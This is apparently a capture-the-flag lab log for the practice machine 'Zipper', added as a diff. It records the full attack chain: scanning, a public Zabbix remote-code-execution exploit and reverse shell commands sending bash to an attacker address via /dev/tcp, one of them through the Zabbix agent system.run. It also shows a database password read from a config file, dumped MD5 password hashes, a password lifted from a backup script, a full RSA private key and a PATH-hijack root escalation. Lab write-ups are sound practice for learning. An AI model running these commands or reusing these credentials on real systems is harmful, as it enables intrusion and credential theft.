@@ -1,0 +1,438 @@
+Machine-Name  :  Zipper
+IP-Address:   :  10.129.1.198
+
+Command-Line: sudo nmap -A 10.129.1.198
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 02:29 EST
+    Nmap scan report for zipper.htb (10.129.1.198)
+    Host is up (0.053s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
+    |   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
+    |_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=1/11%OT=22%CT=1%CU=39686%PV=Y%DS=2%DC=T%G=Y%TM=5FFBFE6
+    OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=A)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+    OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 995/tcp)
+    HOP RTT      ADDRESS
+    1   56.11 ms 10.10.14.1
+    2   51.59 ms zipper.htb (10.129.1.198)
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 23.00 seconds
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301 -u http://10.129.1.198
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-01-13_01-21-17.log
+
+    Target: http://10.129.1.198/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.198/_21-01-13_01-21-19.txt
+
+    [01:21:19] Starting:
+    [01:32:43] 301 -  313B  - /zabbix  ->  http://10.129.1.198/zabbix/
+    [01:32:43] 200 -    3KB - /zabbix/
+
+Brower: http://10.129.1.198/zabbix/
+Result: Login page.
+
+Notes: Searched: "What is Zabbix?"
+    Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption.
+
+
+Command-Line: searchsploit zabbix
+Result:
+    Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution | php/webapps/39937.py
+
+
+Command-Line: searchsploit -x php/webapps/39937.py
+Notes: Looked at the file.
+Command-Line: searchsploit -m php/webapps/39937.py
+Result:
+    39937.py
+
+Notes: Changed settings within file:
+    login = 'zapper'                ### Zabbix login
+    password = 'zapper'     ### Zabbix password
+    hostid = '10105'        ### Zabbix hostid
+
+
+
+Command-Line: python 39937.py
+Result:
+    [zabbix_cmd]>>:
+
+Command-Line: nc -lvnp 9010
+[zabbix_cmd]>>: bash -c "bash -i >& /dev/tcp/10.10.14.11/9010 0>&1"
+
+Result:
+    zabbix@233b94bb51df:/$
+
+Browser: How to change the database password in zabbix
+Result:
+    URL: https://sysads.co.uk/2014/01/04/change-zabbix-database-password/
+
+zabbix@233b94bb51df:/$ cd /etc/zabbix
+zabbix@233b94bb51df:/$ cat zabbix_server.conf
+Notes: Found:
+    DBUser=zabbix
+    DBPassword=f.YMeMd$pTbpY3-449
+
+zabbix@233b94bb51df:/$ script -q /dev/null
+Result: Shell Access.
+    $
+
+$ mysql -u zabbix -p
+Password: f.YMeMd$pTbpY3-449
+
+Result: msql shell
+
+msql>: show databases;
+Result:
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | zabbixdb           |
+    +--------------------+
+    2 rows in set (0.00 sec)
+
+mysql>: use zabbixdb;
+Result:
+    Reading table information for completion of table and column names
+    You can turn off this feature to get a quicker startup with -A
+
+    Database changed
+
+
+mysql> show tables;
+    show tables;
+    +----------------------------+
+    | Tables_in_zabbixdb         |
+    +----------------------------+
+    | acknowledges               |
+    | actions                    |
+    | alerts                     |
+    | application_discovery      |
+    | application_prototype      |
+    | application_template       |
+    | applications               |
+    | auditlog                   |
+    | auditlog_details           |
+    | autoreg_host               |
+    | conditions                 |
+    | config                     |
+    | dbversion                  |
+    | dchecks                    |
+    | dhosts                     |
+    | drules                     |
+    | dservices                  |
+    | escalations                |
+    | events                     |
+    | expressions                |
+    | functions                  |
+    | globalmacro                |
+    | globalvars                 |
+    | graph_discovery            |
+    | graph_theme                |
+    | graphs                     |
+    | graphs_items               |
+    | group_discovery            |
+    | group_prototype            |
+    | groups                     |
+    | history                    |
+    | history_log                |
+    | history_str                |
+    | history_text               |
+    | history_uint               |
+    | host_discovery             |
+    | host_inventory             |
+    | hostmacro                  |
+    | hosts                      |
+    | hosts_groups               |
+    | hosts_templates            |
+    | housekeeper                |
+    | httpstep                   |
+    | httpstepitem               |
+    | httptest                   |
+    | httptestitem               |
+    | icon_map                   |
+    | icon_mapping               |
+    | ids                        |
+    | images                     |
+    | interface                  |
+    | interface_discovery        |
+    | item_application_prototype |
+    | item_condition             |
+    | item_discovery             |
+    | items                      |
+    | items_applications         |
+    | maintenances               |
+    | maintenances_groups        |
+    | maintenances_hosts         |
+    | maintenances_windows       |
+    | mappings                   |
+    | media                      |
+    | media_type                 |
+    | opcommand                  |
+    | opcommand_grp              |
+    | opcommand_hst              |
+    | opconditions               |
+    | operations                 |
+    | opgroup                    |
+    | opinventory                |
+    | opmessage                  |
+    | opmessage_grp              |
+    | opmessage_usr              |
+    | optemplate                 |
+    | profiles                   |
+    | proxy_autoreg_host         |
+    | proxy_dhistory             |
+    | proxy_history              |
+    | regexps                    |
+    | rights                     |
+    | screen_user                |
+    | screen_usrgrp              |
+    | screens                    |
+    | screens_items              |
+    | scripts                    |
+    | service_alarms             |
+    | services                   |
+    | services_links             |
+    | services_times             |
+    | sessions                   |
+    | slides                     |
+    | slideshow_user             |
+    | slideshow_usrgrp           |
+    | slideshows                 |
+    | sysmap_element_url         |
+    | sysmap_url                 |
+    | sysmap_user                |
+    | sysmap_usrgrp              |
+    | sysmaps                    |
+    | sysmaps_elements           |
+    | sysmaps_link_triggers      |
+    | sysmaps_links              |
+    | timeperiods                |
+    | trends                     |
+    | trends_uint                |
+    | trigger_depends            |
+    | trigger_discovery          |
+    | triggers                   |
+    | users                      |
+    | users_groups               |
+    | usrgrp                     |
+    | valuemaps                  |
+    +----------------------------+
+    113 rows in set (0.01 sec)
+
+mysql> describe users;
+    describe users;
+    +----------------+---------------------+------+-----+---------+-------+
+    | Field          | Type                | Null | Key | Default | Extra |
+    +----------------+---------------------+------+-----+---------+-------+
+    | userid         | bigint(20) unsigned | NO   | PRI | NULL    |       |
+    | alias          | varchar(100)        | NO   | UNI |         |       |
+    | name           | varchar(100)        | NO   |     |         |       |
+    | surname        | varchar(100)        | NO   |     |         |       |
+    | passwd         | char(32)            | NO   |     |         |       |
+    | url            | varchar(255)        | NO   |     |         |       |
+    | autologin      | int(11)             | NO   |     | 0       |       |
+    | autologout     | int(11)             | NO   |     | 900     |       |
+    | lang           | varchar(5)          | NO   |     | en_GB   |       |
+    | refresh        | int(11)             | NO   |     | 30      |       |
+    | type           | int(11)             | NO   |     | 1       |       |
+    | theme          | varchar(128)        | NO   |     | default |       |
+    | attempt_failed | int(11)             | NO   |     | 0       |       |
+    | attempt_ip     | varchar(39)         | NO   |     |         |       |
+    | attempt_clock  | int(11)             | NO   |     | 0       |       |
+    | rows_per_page  | int(11)             | NO   |     | 50      |       |
+    +----------------+---------------------+------+-----+---------+-------+
+    16 rows in set (0.00 sec)
+
+
+mysql> select userid, alias, name, passwd from users;
+Result:
+    select userid, alias, name, passwd from users;
+    +--------+--------+--------+----------------------------------+
+    | userid | alias  | name   | passwd                           |
+    +--------+--------+--------+----------------------------------+
+    |      1 | Admin  | Zabbix | 65e730e044402ef2e2f386a18ec03c72 |
+    |      2 | guest  |        | d41d8cd98f00b204e9800998ecf8427e |
+    |      3 | zapper | zapper | 16a7af0e14037b567d7782c4ef1bdeda |
+    +--------+--------+--------+----------------------------------+
+
+Command-Line: echo "65e730e044402ef2e2f386a18ec03c72" | wc -c
+Result:
+    33
+Notes: Hash is probably md5sum.
+Command-Line: echo -n 'f.YMeMd$pTbpY3-449' | md5sum
+Result:
+    65e730e044402ef2e2f386a18ec03c72
+Notes: md5sum hashes match each other. Indicating the password for Admin is "f.YMeMd$pTbpY3-449".
+
+
+Notes: Logged into zabbix using credentials:
+  username: admin
+  password: f.YMeMd$pTbpY3-449
+
+Browser: zabbix agent system.run
+URL: https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix_agent
+
+
+zabbix@233b94bb51df:/$ echo "system.run[bash -c 'nohup bash -i >& /dev/tcp/10.10.14.11/9002 0>&1 &']" | nc 172.17.0.1 10050
+
+Command-Line: nc -lknp 9002
+
+zabbix@zipper:/home/zapper/utils$ cat backup.sh
+Result:
+    cat backup.sh
+    #!/bin/bash
+    #
+    # Quick script to backup all utilities in this folder to /backups
+    #
+    /usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
+
+Notes: Found "zapper" password: ZippityDoDah
+
+zabbix@zipper:/home/zapper/utils$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+zabbix@zipper:/home/zapper/utils$ su - zapper
+Password: ZippityDoDah
+Result:
+    Welcome to:
+    ███████╗██╗██████╗ ██████╗ ███████╗██████╗
+    ╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
+    ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
+    ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
+    ███████╗██║██║     ██║     ███████╗██║  ██║
+    ╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
+
+    [0] Packages Need To Be Updated
+    [>] Backups:
+    4.0K    /backups/zapper_backup-2021-01-14.7z
+    4.0K    /backups/zabbix_scripts_backup-2021-01-14.7z
+
+
+    zapper@zipper:~$
+    *** USER ACCESS ***
+
+zapper@zipper:~$ cat user.txt
+Result: aa29e93f48c64f8586448b6f6e38fe33
+    *** USER OWNED ***
+
+
+Command-Line: nano id_rsa
+File-Contents:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
+l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
+GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
+eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
+2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
+eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
++docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
+84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
+aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
+UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
+8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
+rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
+UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
+oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
+ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
+zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
+8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
+OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
+7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
+m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
+Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
+MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
+lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
+WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
+Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
+-----END RSA PRIVATE KEY-----
+
+Command-Line: chmod 600 id_rsa
+Command-Line: ssh -i id_rsa zapper@10.129.1.198
+Result: Easier access to shell.
+
+zapper@zabbix:~$ cd utils
+zapper@zabbix:~/utils$ ltrace ./zabbix-server
+Result:
+fgets(Start or Stop?): Start
+Result:
+    system("systemctl daemon-reload && syste"...Faled to reload daemon: The name org.free...)
+
+Notes: system commasnd into systemctl. No "sudo" command in front of "systemctl". Indicating this is vulnerable to PATH hijacking. Set UID binaries do not have a safe path.
+
+zapper@zabbix:~/utils$ touch /tmp/systemctl
+File-Contents:
+    #!/bin/bash
+    bash
+zapper@zabbix:~/utils$ chmod +x /tmp/systemctl
+zapper@zabbix:~/utils$ export PATH=/tmp:$PATH
+zapper@zabbix:~/utils$ systemctl
+Result:
+    Welcome to:
+    ███████╗██╗██████╗ ██████╗ ███████╗██████╗
+    ╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
+    ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
+    ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
+    ███████╗██║██║     ██║     ███████╗██║  ██║
+    ╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
+
+    [0] Packages Need To Be Updated
+    [>] Backups:
+    4.0K    /backups/zapper_backup-2021-01-14.7z
+    4.0K    /backups/zabbix_scripts_backup-2021-01-14.7z
+
+
+    zapper@zabbix:~/utils$
+
+
+zapper@zabbix:~/utils$ exit
+Result:
+    exit
+    zapper@zabbix:~/utils$
+
+
+Notes: Can now run full vulnerability attack.
+
+zapper@zabbix:~/utils$ ./zabbix-service
+Result:
+    root@zipper:~/utils#
+    *** ROOT ACCESS ***
+
+root@zipper:~/utils# cd /
+root@zipper:/# cat /root/root.txt
+Result: Root Hash
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
